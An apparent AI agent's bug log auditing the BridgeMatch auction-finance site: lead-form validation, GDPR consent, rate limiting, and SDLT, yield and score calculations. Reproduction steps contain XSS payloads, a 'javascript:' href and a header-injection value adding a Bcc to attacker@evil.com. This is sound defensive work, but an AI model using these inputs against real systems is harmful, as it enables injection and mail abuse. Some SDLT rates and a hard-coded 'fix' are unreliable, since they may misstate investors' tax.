# BridgeMatch Bug Log — Forms & Data Agent
Started: Sat Mar 14 03:13:46 GMTST 2026

## BUG 1
**File:** server.js lines 747-765
**Area:** Enquiry Form — Security (XSS in Email Notification)
**Severity:** High
**Description:** The `/api/leads` email notification HTML template interpolates user-supplied values (`name`, `email`, `phone`, `propertyAddress`, `auctionUrl`, etc.) directly into HTML without escaping. An attacker could submit a lead with a malicious name like `<script>alert(1)</script>` or a crafted `auctionUrl` containing JavaScript, and this would be rendered in the notification email sent to `hello@bridgematch.co.uk`. While most email clients strip scripts, some render HTML attributes (e.g., `onload`, `onerror` in `<a>` or `<img>` tags), and the `auctionUrl` is inserted directly into an `<a href="">` tag — a malicious URL like `javascript:alert(1)` could be dangerous if clicked.
**Reproduction steps:**
1. POST to `/api/leads` with `name: '<img src=x onerror=alert(1)>'` and `auctionUrl: 'javascript:void(0)'`
2. The resulting email HTML will contain unescaped HTML in the `<td>` cells and an unsafe href
**Suggested fix:** HTML-escape all user-supplied values before interpolating them into the email template. Validate that `auctionUrl` starts with `http://` or `https://` before including it as an href.
---

## BUG 2
**File:** server.js lines 692-784
**Area:** Enquiry Form — Submission (No Rate Limiting on Lead Endpoint)
**Severity:** High
**Description:** The `/api/leads` endpoint has no rate limiting. The analysis endpoint (`/api/analyse`) has a per-IP daily limit of 5 requests via Supabase, but the leads endpoint has none. An attacker or bot could spam the endpoint with thousands of fake leads, flooding the Supabase `leads` table and triggering thousands of notification emails via Resend (which may also have billing implications).
**Reproduction steps:**
1. Send 1000 POST requests to `/api/leads` with valid-looking data in a loop
2. All 1000 will be accepted, inserted into the database, and trigger notification emails
**Suggested fix:** Add rate limiting similar to `/api/analyse` — e.g., max 3-5 lead submissions per IP per day via the existing Supabase `rate_limits` table. The reference file `server_leads_endpoint.js` already contains rate-limit logic (max 5 leads per email per hour) that was never integrated.
---

## BUG 3
**File:** bridgematch-lite.html lines 806-864, server.js lines 692-784
**Area:** Enquiry Form — Spam Protection
**Severity:** Medium
**Description:** Neither the BridgeMatch Lite lead form nor the landing page email capture form has any bot/spam protection — no honeypot field, no CAPTCHA, no reCAPTCHA, no Cloudflare Turnstile. Combined with the lack of server-side rate limiting (Bug 2), this makes the forms highly vulnerable to automated spam submissions.
**Reproduction steps:**
1. Inspect the form HTML — no hidden honeypot fields exist
2. Submit via cURL/script without any challenge token — it succeeds
**Suggested fix:** Add a honeypot field (hidden input that bots fill but humans don't) as a quick win, and consider adding Cloudflare Turnstile or reCAPTCHA for stronger protection.
---

## BUG 4
**File:** bridgematch-lite.html lines 914, 920; server.js line 708
**Area:** Enquiry Form — Validation (Weak Email Validation)
**Severity:** Medium
**Description:** Email validation on both client and server only checks for the presence of `@` character (`email.includes('@')`). This accepts obviously invalid emails like `@`, `@@`, `foo@`, `@bar`, or `hello@.` as valid. There is no check for a domain part, TLD, or basic RFC pattern compliance. This will result in junk data in the leads database and failed notification emails.
**Reproduction steps:**
1. Enter name "Test", email "@", phone "07700900000" in the BridgeMatch Lite form
2. Check consent, submit — form submits successfully
3. The lead is stored with email "@" in the database
**Suggested fix:** Use a more robust email regex such as `/^[^\s@]+@[^\s@]+\.[^\s@]+$/` on both client and server side. Even a simple check for `user@domain.tld` format would catch the most egregious cases.
---

## BUG 5
**File:** bridgematch-lite.html line 920
**Area:** Enquiry Form — Validation (Phone Number Accepts Non-Numeric Input)
**Severity:** Medium
**Description:** Phone validation only checks `phone.length < 10`. It does not validate that the input contains digits. A user could enter "aaaaaaaaaa" (10 letters) and it would pass validation. The `type="tel"` attribute on the input provides a numeric keyboard on mobile but does not enforce numeric-only input on desktop browsers.
**Reproduction steps:**
1. Enter name "Test", valid email, phone "abcdefghij" (10 letters)
2. Submit — passes client-side validation and is stored in database
**Suggested fix:** Add a regex check like `/^\+?[\d\s()-]{10,15}$/` to validate that the phone number contains primarily digits. Strip non-digit characters before length check.
---

## BUG 6
**File:** bridgematch-lite.html line 855
**Area:** Enquiry Form — Validation (Consent Checkbox Pre-Checked)
**Severity:** Medium
**Description:** The consent checkbox (`id="leadConsent"`) has the `checked` attribute set by default: `<input type="checkbox" id="leadConsent" checked>`. Under GDPR and UK data protection regulations, consent should be affirmative — the user must actively opt in. Pre-ticking a consent checkbox may not constitute valid consent and could expose the business to regulatory risk.
**Reproduction steps:**
1. Open a BridgeMatch Lite page with deal results
2. Observe the consent checkbox is already ticked when the form renders
**Suggested fix:** Remove the `checked` attribute from the consent checkbox so users must actively tick it.
---

## BUG 7
**File:** bridgematch-lite.html line 829
**Area:** Enquiry Form — Display (Placeholder FCA Number)
**Severity:** High
**Description:** The regulated mortgage notice displays `FCA Registration Number: [XXXXXX]` — a placeholder that was never replaced with the actual FCA number for Mortgage Style. This is visible to users when they select "Yes — I'll live there" for occupancy, and also appears in the success message after submission (line 985). Displaying a placeholder FCA number to consumers is potentially a regulatory compliance issue.
**Reproduction steps:**
1. Open BridgeMatch Lite page
2. Click "Yes — I'll live there" button
3. Observe the regulated notice shows `[XXXXXX]` instead of a real FCA number
**Suggested fix:** Replace `[XXXXXX]` with Mortgage Style's actual FCA registration number at lines 829 and 985.
---

## BUG 8
**File:** index.html (no enquiry form found)
**Area:** Enquiry Form — Structure (No Enquiry Form on Auction Listing Detail Pages)
**Severity:** High
**Description:** The main auction listing detail pages (index.html expanded card view) do NOT have a BridgeMatch enquiry/pre-qualification form. The only lead generation mechanism on index.html is the email newsletter capture form (lines 1015-1023) and the "Finance Check" widget (lines 2608-2672) which links out to BridgeMatch Lite. The requirement states "the enquiry form should pre-fill from listing data (guide price, property type)" — but there is no enquiry form embedded in the listing detail view. Users must click through to BridgeMatch Lite to submit an enquiry, adding friction to the conversion funnel.
**Reproduction steps:**
1. Go to bridgematch.co.uk/auctions
2. Click on any lot to expand the detail view
3. Observe: there is a "Finance Check" widget and a "See all matches on BridgeMatch" link, but no embedded enquiry form with name/email/phone fields
**Suggested fix:** Either embed a simplified lead capture form directly in the expanded lot detail view, or ensure the "See all matches on BridgeMatch" link pre-fills all relevant listing data (price, type, address) into the BridgeMatch Lite form URL parameters.
---

## BUG 9
**File:** server.js line 6460; CLAUDE.md scoring documentation
**Area:** Scoring — Data Integrity (Score Not Capped at 0-10)
**Severity:** Medium
**Description:** The CLAUDE.md states "Score capping: score range 0-10, never exceed" but the scoring code at line 6460 only rounds the score (`Math.round(s * 10) / 10`) — it never clamps it to 0-10. A lot with many positive signals (e.g., needs work +2.0, development +2.0, executor +1.5, low £/sqft +2.0, high GIY +2.5, below market +2.0, vacancy +1.0, freehold +0.5, title split +1.0, quick completion +0.5, motivated +0.5) could theoretically score 15.5. Similarly, lots with many risks could go negative. The enrichment stage (lines 6923, 6943) adds more score without capping.
**Reproduction steps:**
1. Find or construct a lot that triggers 5+ positive scoring signals
2. Observe the score exceeds 10
**Suggested fix:** Add `L.score = Math.max(0, Math.min(10, L.score));` after the final score calculation at line 6460 and after enrichment additions at lines 6923 and 6943.
---

## BUG 10
**File:** index.html lines 2440-2453
**Area:** Deal Analysis Calculator — Data Integrity (Bridging Cost Formula Error)
**Severity:** Medium
**Description:** The deal analysis calculator computes bridging cost as `loanAmt * 0.0075 * 12` (line 2445). This calculates simple interest: 0.75% per month × 12 months = 9% of loan amount. However, bridging finance interest is typically rolled up (compounded monthly), not simple interest. For a £150k loan at 0.75%/mo, simple interest = £13,500 but rolled-up compound interest = £14,087. The error grows with larger loans and longer terms. This may mislead users about the true cost of finance.
**Reproduction steps:**
1. Call `calcDealAnalysis(200000, 250000, 6, 800)` in console
2. Bridging cost = 200000 × 0.75 × 0.0075 × 12 = £13,500
3. Correct rolled-up cost = 150000 × ((1.0075^12) - 1) = £14,087
**Suggested fix:** Either use compound interest formula `loanAmt * ((1.0075 ** 12) - 1)` or add a note that this is a simplified estimate using simple interest. Given the audience (investors), accuracy matters.
---

## BUG 11
**File:** index.html lines 2447-2449
**Area:** Deal Analysis Calculator — Data Integrity (Missing Bridging Cost from Total)
**Severity:** Medium
**Description:** The `totalCostIn` calculation is `guidePrice + sdlt + bridgingCost + otherCosts` but `cashIn` (the investor's cash outlay) is `guidePrice - loanAmt + sdlt + otherCosts` — bridging cost is excluded from `cashIn`. This means the bridging interest cost is counted in `totalCostIn` (affecting profit) but not in `cashIn` (affecting ROI). Since bridging interest is typically rolled up into the loan (not paid from cash), this is arguably correct for the cash outlay, but it inflates the ROI figure because the denominator (cashIn) is artificially low while the numerator (netProfit) already deducts bridging cost.
**Reproduction steps:**
1. Call `calcDealAnalysis(200000, 250000, 6, 800)`
2. loanAmt = 150,000; bridgingCost = 13,500; sdlt = 10,000; otherCosts = 8,000
3. totalCostIn = 200,000 + 10,000 + 13,500 + 8,000 = 231,500
4. netProfit = 250,000 - 231,500 = 18,500
5. cashIn = 200,000 - 150,000 + 10,000 + 8,000 = 68,000 (excludes 13,500 bridging)
6. ROI = 18,500 / 68,000 = 27% — but the actual exit debt would be 150,000 + 13,500 = 163,500, so real net = 250,000 - 163,500 - 10,000 - 8,000 - 50,000(deposit) — the calc is internally inconsistent
**Suggested fix:** Clarify whether bridging cost is rolled up or paid from cash, and make `totalCostIn` and `cashIn` consistent. If rolled up, the loan exit amount should be loanAmt + bridgingCost, which affects netProfit but not cashIn. Current formula double-counts: bridging cost reduces profit AND isn't reflected in the exit repayment amount.
---

## BUG 12
**File:** index.html lines 2430-2436
**Area:** SDLT Calculator — Data Integrity (Incorrect Tax Brackets)
**Severity:** Medium
**Description:** The SDLT calculator uses investor rates with a flat 5% on the first £250k. As of April 2025, the additional property surcharge increased from 3% to 5%. The standard SDLT rate on the first £250k is 0%, so the investor rate on the first £250k should be 0% + 5% surcharge = 5%. This happens to be correct for the first band. However, the second band uses 10% (standard 5% + 5% surcharge) — but the standard rate for £250k-£925k is 5%, so investor rate should be 5% + 5% = 10%. This is correct. The third band uses 15% (standard 10% + 5% = 15%). This is correct. The £1.5m+ band uses 17% — this appears to be from the 2025 rates (standard 12% + 5% surcharge). As of October 2024, the top SDLT rate for properties over £1.5m is 12% standard + 5% surcharge = 17%. This appears correct as of the 2025/26 rates. No bug here after verification.
**Reproduction steps:** N/A — upon detailed review, the SDLT rates appear correct for 2025/26 investor purchases.
**Suggested fix:** N/A — rates verified as correct.
---

## BUG 13
**File:** bridgematch-lite.html lines 979-994
**Area:** Enquiry Form — Submission (Double Submit Possible During Network Latency)
**Severity:** Low
**Description:** The form disables the submit button during submission (line 934) and replaces the entire form with a success message on success (lines 981-994). However, the submit button is an `onclick` handler on a regular `<button>` — not a form submit event. If a user rapidly clicks the button before the `disabled = true` takes effect (e.g., during a slow JavaScript event loop), multiple fetch requests could fire. The `onclick` handler calls `submitLead()` directly without any guard flag beyond the button's disabled state.
**Reproduction steps:**
1. Open BridgeMatch Lite, fill in form with valid data
2. Rapidly double-click the "Speak to a Broker" button
3. In theory, two requests could fire before the button is disabled
**Suggested fix:** Add a module-level `isSubmitting` boolean flag that is checked at the top of `submitLead()` and set to `true` before the fetch call. This is more reliable than relying solely on `button.disabled`.
---

## BUG 14
**File:** index.html lines 2723-2758
**Area:** Email Capture Form — Submission (Button Not Re-Enabled on Non-OK Response)
**Severity:** Low
**Description:** In `submitEmailCapture()`, if the server returns a non-200 response, the code at line 2746 throws an error which is caught by the `.catch()` handler. The catch handler re-enables the button (line 2754). However, line 2744 does `r.json().then(d => ({ ok: r.ok, data: d }))` — if the response body is not valid JSON (e.g., a 502 gateway error returning HTML), the `.json()` call will throw, and since this is inside `.then(r => r.json()...)`, the error message will be a confusing JSON parse error like "Unexpected token < in JSON at position 0" rather than a user-friendly message.
**Reproduction steps:**
1. Simulate a 502 error from the server (e.g., Railway returning an HTML error page)
2. The error message displayed to the user will be a JSON parse error
**Suggested fix:** Add a `r.ok` check before parsing JSON, and provide a fallback error message for non-JSON responses.
---

## BUG 15
**File:** server.js lines 6903-6924, 6930-6943
**Area:** Yield/Comparables — Data Integrity (Street Average Mixes Property Types)
**Severity:** Medium
**Description:** The Land Registry comparable sales used to calculate `streetAvg` include all property types in the postcode — flats, terraced houses, detached houses, commercial, etc. When calculating "below market" percentage, a 2-bed flat at £80k in a postcode where detached houses sold for £300k would show as "73% below market" and receive +2 score points, which is misleading. The `relevantSales` filter (line 6904) only checks `s.price > 0` but doesn't filter by matching property type.
**Reproduction steps:**
1. Find a lot that is a flat in a postcode with mostly house sales
2. The streetAvg will be inflated by higher-value house sales
3. The lot will incorrectly show as significantly "below market"
**Suggested fix:** Filter `relevantSales` by matching property type where possible (the Land Registry data includes `propertyType`). At minimum, separate flats from houses in the comparison.
---

## BUG 16
**File:** server.js line 6935
**Area:** Yield Calculation — Data Integrity (Estimated Yield Based on Guide Price, Not Market Value)
**Severity:** Low
**Description:** The estimated gross yield is calculated as `estAnnualRent / lot.price` where `lot.price` is the guide price. Auction guide prices are typically set 10-30% below market value to attract bidders. Using guide price as the denominator inflates the yield calculation. A property with £825/month rent and £100k guide (but £130k likely sale price) shows as 9.9% yield, but actual yield at purchase would be ~7.6%. This is documented in CLAUDE.md ("Yield calculation: uses guide price, not sold price") but may mislead users.
**Reproduction steps:**
1. View any lot with a guide price and estimated yield
2. The yield is calculated against the guide price, not the expected sale price
**Suggested fix:** Add a visible disclaimer like "Based on guide price — actual yield will depend on sale price" next to estimated yield displays. Optionally calculate yield at guide + 20% as a more realistic estimate.
---

## BUG 17
**File:** index.html lines 2440-2453
**Area:** Deal Analysis Calculator — Data Integrity (Assumes Street Average = Post-Works GDV)
**Severity:** Medium
**Description:** The `calcDealAnalysis()` function uses `streetAvg` as the exit value (GDV) in the uplift and profit calculations: `netProfit = streetAvg - totalCostIn`. But `streetAvg` is the average historical sale price of properties on the street — NOT the post-refurbishment gross development value. For a derelict property needing £50k of works, the GDV would typically be higher than street average (due to the improvements), and the works cost is not factored into `totalCostIn` at all. The function takes no `worksCost` parameter.
**Reproduction steps:**
1. Call `calcDealAnalysis(100000, 150000, 7, 700)` — guide £100k, street avg £150k
2. The profit calculation assumes you can buy at £100k, spend nothing on works, and sell at £150k
3. In reality, the property may need £30k+ of works to achieve £150k sale price
**Suggested fix:** Add a `worksCost` parameter to `calcDealAnalysis()` and include it in `totalCostIn`. The function signature already hints at deal analysis but ignores the most critical cost for auction refurb deals.
---

## BUG 18
**File:** index.html lines 1015-1023
**Area:** Email Capture Form — Validation (No Server-Side Duplicate Check)
**Severity:** Low
**Description:** The email capture form on the landing page submits to `/api/leads` with `source: 'landing-page'`. There is no duplicate check — a user (or bot) can subscribe the same email address multiple times, creating duplicate entries in the leads table. The reference implementation in `server_leads_endpoint.js` had rate limiting (max 5 per email per hour) but this was never integrated into the active `server.js`.
**Reproduction steps:**
1. Fill in the email capture form with name "Test" and email "test@example.com"
2. After success, refresh the page and submit again with the same details
3. Both entries are created in the database
**Suggested fix:** Add a duplicate check: if the same email already exists in the leads table with `source: 'landing-page'`, return a success response without creating a duplicate row.
---

## BUG 19
**File:** bridgematch-lite.html line 464
**Area:** Deal Stacking — Data Integrity (SDLT Calculation Critically Wrong)
**Severity:** Critical
**Description:** The SDLT calculation in `matchLenders()` uses completely wrong tax rates. The formula `price<=250000?0:price<=925000?(price-250000)*0.05:...` charges 0% on the first £250k and only 5% on the £250k–£925k band. For investment properties (the primary use case), the correct rates are 5% on the first £250k (5% surcharge), 10% on £250k–£925k (5% standard + 5% surcharge), and 15% on £925k–£1.5m. This is the same code that `index.html` gets right with `calcSDLT()` (line 2430). The bridgematch-lite version massively understates stamp duty — for a £200k property it shows £0 instead of £10,000; for a £500k property it shows £12,500 instead of £37,500. This directly misleads investors about their cash outlay and could cause deals to fall through when the real SDLT bill arrives.
**Reproduction steps:**
1. Open BridgeMatch Lite, enter £200,000 purchase price with £50,000 cash
2. The "Other costs" section shows Stamp Duty ~£0
3. Correct investor SDLT for £200k = £10,000 (£200,000 × 5%)
4. For £500k: shows ~£12,500 instead of correct £37,500
**Suggested fix:** Replace the SDLT formula at line 464 with the correct investor-rate calculation matching `calcSDLT()` in index.html: `if(price<=250000) return Math.round(price*0.05); let sdlt=250000*0.05; if(price<=925000) sdlt+=(price-250000)*0.1; else{sdlt+=(925000-250000)*0.1;sdlt+=(Math.min(price,1500000)-925000)*0.15;} if(price>1500000) sdlt+=(price-1500000)*0.17;`
---

## BUG 20
**File:** server.js lines 6629-6641
**Area:** Yield Calculation — Data Integrity (Rent Estimation First-Match Bias Causes Misattribution)
**Severity:** Medium
**Description:** `estimateMonthlyRent()` iterates `Object.entries(VOA_RENTS)` and returns on the first key found in the address via `a.includes(key)`. Because JavaScript objects maintain insertion order, regional fallback keys like `'east'` (line 6619) match addresses containing "east" before more specific regional entries. For example, "Eastbourne" matches `'east'` (East of England, £950/mo for 2-bed) instead of being classified as South East (£1,200/mo for 2-bed). Similarly, "Richmond, North Yorkshire" matches `'richmond'` (line 6567, London borough rents ~£1,850/mo for 2-bed) when it should use Yorkshire rates (~£750/mo). This produces incorrect yield estimates — a 2-bed in Eastbourne at £100k would show ~11.4% yield instead of ~14.4%, or vice versa depending on which direction the misattribution goes.
**Reproduction steps:**
1. Call `estimateMonthlyRent('Eastbourne', 2)` — returns £1,045 (east × 1.1 uplift) instead of correct South East rate ~£1,320
2. Call `estimateMonthlyRent('Richmond, North Yorkshire', 2)` — returns London-level rents (~£1,850) instead of Yorkshire rates (~£825)
**Suggested fix:** Sort keys by specificity (longer keys first) or check more specific entries before regional fallbacks. Also consider matching against postcode prefixes rather than address substrings.
---

## BUG 21
**File:** bridgematch-lite.html line 464
**Area:** Deal Stacking — Data Integrity (SDLT Formula Has Redundant Branch)
**Severity:** Low
**Description:** The SDLT ternary at line 464 has a logically redundant condition. The else branch (price > £925k) computes `(price-250000)*0.05+(price>925000?(price-925000)*0.05:0)`. The inner `price>925000?` check is always true at that point because we only reach the else when `price > 925000` (the outer ternary already checked `price<=925000`). This doesn't cause a wrong result but makes the code harder to read and audit, which contributed to the incorrect rates going unnoticed (Bug 19).
**Reproduction steps:** N/A — code review finding
**Suggested fix:** When fixing Bug 19, rewrite the SDLT calculation as a clear multi-step function matching the index.html implementation.
---

## BUG 22
**File:** bridgematch-lite.html lines 879-887
**Area:** Enquiry Form — Display (Redundant Class Manipulation in setOccupancy)
**Severity:** Low
**Description:** The `setOccupancy('owner')` branch contains redundant class operations: `ownBtn.classList.add('active-reg')` is called 3 times, `classList.remove('occ-btn')` is immediately followed by `classList.add('occ-btn')`, and then `ownBtn.className = 'occ-btn active-reg'` overwrites all previous classList operations. While the end result is correct (the className assignment wins), the messy intermediate operations suggest the code was iteratively debugged and left in a confusing state. If `className` is ever removed, the classList operations will produce inconsistent results.
**Reproduction steps:**
1. Read lines 879-887 — the class manipulation is visibly redundant
2. Toggle occupancy in the UI — it works, but only because the final `className =` assignment overwrites everything
**Suggested fix:** Remove lines 880-886 (the classList operations) and keep only the `className` assignments at lines 886-887.
---

## BUG 23
**File:** bridgematch-lite.html line 466
**Area:** Deal Stacking — Data Integrity (totalCashNeeded Excludes Deposit)
**Severity:** Medium
**Description:** `totalCashNeeded` is calculated as `stampDuty + estCosts` (line 466), but excludes the actual cash deposit (`cashForDeposit = Math.min(cash, price)` at line 463). This variable name suggests it represents the total cash an investor needs, but it only captures ancillary costs. While `totalCashNeeded` is used in the results display to show additional costs beyond the deposit, the name is misleading and could lead to future integration bugs. More critically, since `stampDuty` is wrong (Bug 19), `totalCashNeeded` is also wrong.
**Reproduction steps:**
1. Enter £200k property with £50k cash
2. totalCashNeeded = £0 (wrong SDLT) + £8,000 (4% costs) = £8,000
3. Correct value should be £10,000 (SDLT) + £8,000 = £18,000
**Suggested fix:** Fix the SDLT calculation (Bug 19) and consider renaming to `additionalCosts` or `costsAboveDeposit` for clarity.
---

## BUG 24
**File:** index.html line 1264
**Area:** Yield Filtering — UX / Data Integrity
**Severity:** Medium
**Description:** The "Yield 8%+" preset button (`applyPreset('highyield')`) only sets `$('fSort').value='yield'`, which sorts lots by yield descending. It does NOT filter to lots with yield >= 8%. Every other preset applies an actual filter (e.g., `fMaxPrice`, `fCondition`, `fDeal`), so users reasonably expect "Yield 8%+" to filter out sub-8% lots. Instead, a user clicking this button sees ALL lots, just sorted by yield — including lots with 0% yield at the bottom. This is misleading and inconsistent with the other presets.
**Reproduction steps:**
1. Go to bridgematch.co.uk/auctions
2. Click the "Yield 8%+" chip button
3. Observe: all lots are shown, merely sorted by yield descending — lots with <8% yield are still visible
4. Compare: clicking "Under £100k" correctly filters to only lots under £100k
**Suggested fix:** Add a yield threshold filter. Either add a `fMinYield` dropdown/input to the filter panel and set it to `8` when the preset is clicked, or add filter logic in `applyFilters()` that respects a yield minimum. The preset should set both the sort AND a filter: `$('fSort').value='yield'; $('fMinYield').value='8';`
---

## BUG 25
**File:** server.js line 6460, lines 6937-6943
**Area:** Scoring — Data Integrity (Score Never Clamped Despite Documentation)
**Severity:** Medium
**Description:** Confirming Bug 9 with additional detail: the score is rounded at line 6460 (`Math.round(s * 10) / 10`) and again after enrichment at line 6943, but never clamped to the 0-10 range documented in CLAUDE.md. The enrichment phase (lines 6937-6941) adds +1.5 or +0.5 to the score AFTER the initial scoring. A lot could accumulate: needs work (+2.0), poor condition (+2.5), executor (+1.5), development (+2.0), vacant (+1.0), freehold (+0.5), below market 20%+ (+2.0), high yield >8% (+1.5) = 13.0. The frontend badge logic at line 2515 (`lot.score >= 3 ? 'high'`) works fine for display but scores above 10 are semantically meaningless and could confuse users expecting a 0-10 scale. Additionally, negative scores are possible (lots with multiple risk flags like sitting tenant -2.0, knotweed -2.0, flood -1.0, contamination -1.0 = -6.0 before any positives).
**Reproduction steps:**
1. Find a lot with 5+ positive scoring signals (e.g., executor sale of derelict freehold house with development potential in a cheap area with high yield)
2. Check `lot.score` — it will exceed 10
**Suggested fix:** Add `L.score = Math.max(0, Math.min(10, L.score));` after line 6460 and after line 6943.
---

## BUG 26
**File:** server.js lines 6629-6641
**Area:** Yield Calculation — Data Integrity (Bedroom Count Fallback Silently Defaults to 2-Bed)
**Severity:** Low
**Description:** When `lot.beds` is null/undefined (bedroom count not extracted), `estimateMonthlyRent()` defaults to 2-bed rent via `Math.min(beds ?? 2, 4)`. This affects yield accuracy: a studio flat at £60k with 2-bed rent (~£800/mo) shows ~16% yield, but actual studio rent (~£500/mo) would give ~10%. Conversely, a 5-bed house at £300k shows yield based on 2-bed rent (~£800/mo = 3.2%) when actual rent could be £1,500/mo (6%). There is no indication to the user that bedroom count was unavailable and a default was used.
**Reproduction steps:**
1. Find lots where `beds` is null (common for lots with poor extraction)
2. Compare `estGrossYield` to similar lots where `beds` was correctly extracted
3. The yields may differ significantly due to the 2-bed default
**Suggested fix:** Add a `yieldEstimateQuality` field (e.g., 'estimated' vs 'default') to flag when bedroom count was defaulted. Display a qualifier like "~" or "(est.)" next to yields where bedrooms were unknown.
---

## BUG 27
**File:** index.html lines 2444-2449
**Area:** Deal Analysis Calculator — Data Integrity (Assumes 12-Month Hold Period)
**Severity:** Low
**Description:** The deal analysis calculator hardcodes a 12-month bridging loan term (`loanAmt * 0.0075 * 12`). Most auction refurb deals complete in 6-9 months. A 12-month assumption overstates bridging cost by 33-100%, which deflates the calculated profit and ROI. The function takes no term parameter and provides no way to adjust this assumption.
**Reproduction steps:**
1. Call `calcDealAnalysis(100000, 150000, 7, 600)` in browser console
2. bridgingCost = 75000 * 0.0075 * 12 = £6,750 (based on 12 months)
3. A 6-month term would be £3,375 — nearly half
**Suggested fix:** Add a `termMonths` parameter (defaulting to 9 or 12) and use it in the calculation. Even better, make it an input in the deal analysis UI.
---

## BUG 28
**File:** index.html line 2268; server.js (no server-side date filter)
**Area:** Data Integrity — Past Auction Lots Shown by Default with Edge Case
**Severity:** Low
**Description:** The past-auction filter at line 2268 compares `l._auctionDate >= todayStr` using ISO date string comparison. Lots with `_auctionDate` set to today's date ARE shown (correct). However, lots where `_auctionDate` is null/undefined pass through the filter (`!l._auctionDate` returns true), meaning lots with no auction date are always shown regardless of whether their auction has passed. If the extractor fails to capture the auction date, the lot will appear indefinitely.
**Reproduction steps:**
1. Find lots where `_auctionDate` is null
2. These lots are always shown in the "upcoming" view even if their auction happened weeks ago
**Suggested fix:** Investigate how many lots have null `_auctionDate`. If significant, consider using the house's last known auction date as a fallback. At minimum, flag these lots visually so users know the auction date is unknown.
---

## BUG 29
**File:** bridgematch-lite.html line 860 (onclick handler), lines 950-953 (submitLead)
**Area:** Enquiry Form — Submission (Unhandled URIError from decodeURIComponent)
**Severity:** Low
**Description:** The submit button's `onclick` handler at line 860 encodes price/loan values with `encodeURIComponent(fmtCurrency(r.price))`, and `submitLead()` decodes them with `decodeURIComponent(price)` at lines 950-953. If `fmtCurrency` ever produces a string containing a literal `%` followed by invalid hex (e.g., in certain locales or edge cases), `decodeURIComponent` will throw an unhandled `URIError`, causing the entire submission to silently fail with no error message shown to the user — the `.catch()` handler at line 996 would catch it, but the error message would be the unhelpful "URI malformed".
**Reproduction steps:**
1. If `fmtCurrency` ever returns a string like "100%" (e.g., for LTV display reuse), `decodeURIComponent("100%")` throws `URIError: URI malformed`
2. Currently unlikely with currency values, but the pattern is fragile
**Suggested fix:** Wrap `decodeURIComponent` calls in try/catch, or pass raw numeric values instead of encoded formatted strings through the onclick handler. Passing `r.price` (number) and `r.loanNeeded` (number) directly, then formatting only for display, would be cleaner and safer.
---

## BUG 30
**File:** server.js lines 722-723 (property_price, loan_amount columns)
**Area:** Enquiry Form — Data Integrity (Currency Strings Stored Instead of Integers)
**Severity:** Medium
**Description:** The `/api/leads` endpoint stores `propertyPrice` and `loanAmount` as-is from the client payload. The client sends these as formatted currency strings (e.g., "£200,000" or "%C2%A3200%2C000" decoded). The Supabase `leads` table likely has these columns typed as text or integer. If integer, insertions with currency strings would fail silently or error. If text, the data cannot be queried numerically (e.g., "find all leads over £200k" requires parsing). The `leads_schema.sql` defines `property_price INTEGER` which means formatted strings like "£200,000" would fail to insert or be coerced to NULL/0.
**Reproduction steps:**
1. Submit a BridgeMatch Lite lead with a £200,000 property
2. Check Supabase `leads` table — `property_price` will either be NULL (if type coercion fails silently), 0, or an error depending on Supabase/Postgres strictness
**Suggested fix:** Parse the currency string to an integer (in pence or pounds) on the server before insertion: `parseInt(String(propertyPrice).replace(/[^0-9]/g, '')) || null`. Apply the same to `loanAmount` and `worksBudget`.
---

## BUG 31
**File:** index.html lines 1015-1023
**Area:** Email Capture Form — Compliance (No GDPR Consent Checkbox)
**Severity:** High
**Description:** The landing page email capture form ("Get Weekly Auction Deal Alerts") submits name and email to `/api/leads` but has no consent checkbox. Under GDPR/UK GDPR, collecting personal data for marketing emails requires explicit consent. The BridgeMatch Lite form (bridgematch-lite.html line 855) has a consent checkbox, but the landing page form does not. The only privacy indication is "We respect your privacy" text (line 1022), which does not constitute valid consent. The server stores `consent_given: true` implicitly for all submissions from this form, but no actual consent was obtained.
**Reproduction steps:**
1. Go to bridgematch.co.uk, scroll to the email capture section
2. Enter name and email, click "Subscribe"
3. The submission succeeds without any consent checkbox being ticked
4. The lead is stored with `consent_given` implied
**Suggested fix:** Add a consent checkbox similar to the BridgeMatch Lite form: "I consent to receiving weekly auction deal alerts by email. You can unsubscribe at any time." The checkbox must not be pre-checked (see Bug 6).
---

## BUG 32
**File:** server.js lines 704-706
**Area:** Enquiry Form — Validation (Source Field Bypass on Phone Requirement)
**Severity:** Medium
**Description:** The server-side validation at line 705 skips the phone number requirement if the `source` field is truthy: `if (!phone && !source) return error`. Any client can include `source: 'anything'` in the POST body to bypass the phone validation, even from the BridgeMatch Lite form which should always require phone. The `source` field is entirely client-controlled — there's no whitelist of valid sources. A malicious user could set `source: 'landing-page'` to submit from BridgeMatch Lite without a phone number, or set `source: 'bypass'` to skip validation from any context.
**Reproduction steps:**
1. POST to `/api/leads` with `{ name: "Test", email: "test@example.com", source: "bypass" }` — no phone required
2. The lead is created without a phone number even though it's not from the landing page form
**Suggested fix:** Whitelist valid sources: `const VALID_SOURCES = ['landing-page']; if (!phone && !VALID_SOURCES.includes(source)) return error`. Or better, make phone conditionally required based on the actual source endpoint rather than a client-supplied field.
---

## BUG 33
**File:** server.js lines 747-765
**Area:** Enquiry Form — Security (Email Subject Line Injection)
**Severity:** Medium
**Description:** The Resend email notification subject at line 773 includes the user-supplied `name` field directly: `subject: '🏠 New lead: ${name} — ${propertyPrice || 'price TBC'}'`. While Resend's API likely sanitizes headers, the `name` field could contain newlines or special characters that, depending on the email provider's handling, could be used for email header injection (adding BCC recipients, injecting additional headers). This is a defense-in-depth concern — even if Resend sanitizes, the application should not trust user input in email headers.
**Reproduction steps:**
1. Submit a lead with name `"Test\r\nBcc: attacker@evil.com"`
2. Check if the Resend API includes the injected header (likely sanitized by Resend, but the application should not rely on this)
**Suggested fix:** Strip newlines and control characters from `name` before using it in the email subject: `name.replace(/[\r\n\t]/g, ' ').slice(0, 100)`.
---

## BUG 34
**File:** bridgematch-lite.html lines 970-974
**Area:** Enquiry Form — Error Handling (fetch Failure Shows Unhelpful Error)
**Severity:** Low
**Description:** At line 976, if the server returns a non-OK response, the code does `res.json().then(d => { throw new Error(d.error || 'Submission failed') })`. If the server returns a non-JSON response (e.g., a 502 HTML error page from Railway's proxy, or a timeout), `res.json()` will throw a `SyntaxError` with message like "Unexpected token < in JSON at position 0". This error propagates to the `.catch()` handler and is displayed to the user as-is (line 997: `err.message`), which is confusing and unhelpful.
**Reproduction steps:**
1. Simulate a 502 from the server (e.g., server restart during submission)
2. The error displayed to the user will be "Unexpected token < in JSON at position 0" instead of a friendly message
**Suggested fix:** Check `res.ok` and `res.headers.get('content-type')` before calling `res.json()`. If not JSON, throw a user-friendly error: `throw new Error('Server temporarily unavailable. Please try again.')`.
---

## BUG 35
